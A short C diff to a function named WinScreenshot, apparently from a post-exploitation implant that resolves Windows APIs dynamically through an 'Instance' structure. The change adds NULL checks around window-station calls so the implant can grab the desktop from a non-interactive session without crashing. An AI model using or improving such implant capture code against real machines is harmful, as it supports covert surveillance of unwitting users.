@@ -1135,7 +1135,14 @@ BOOL WinScreenshot(
      * to return NULL or to block waiting for the Win32k session lock.
      * Explicitly open WinSta0\Default and re-bind the thread before any GDI call;
      * this mirrors what interactive processes have implicitly.
+     *
+     * Guard every function pointer before calling — if user32 loaded without
+     * exporting one of these symbols the pointer is NULL and calling it crashes.
      */
+    if ( Instance->Win32.OpenWindowStation    &&
+         Instance->Win32.GetProcessWindowStation &&
+         Instance->Win32.SetProcessWindowStation ) {
+
     dwThreadId = (DWORD)(ULONG_PTR)Instance->Teb->ClientId.UniqueThread;
     hOldWinSta = Instance->Win32.GetProcessWindowStation();
     hWinSta    = Instance->Win32.OpenWindowStation( "WinSta0", FALSE,
@@ -1165,6 +1172,8 @@ BOOL WinScreenshot(
             hWinSta = NULL;
         }
     }
+
+    } /* end: OpenWindowStation && GetProcessWindowStation && SetProcessWindowStation guard */
 
     hDC = Instance->Win32.GetDC( NULL );
     if ( ! hDC ) {
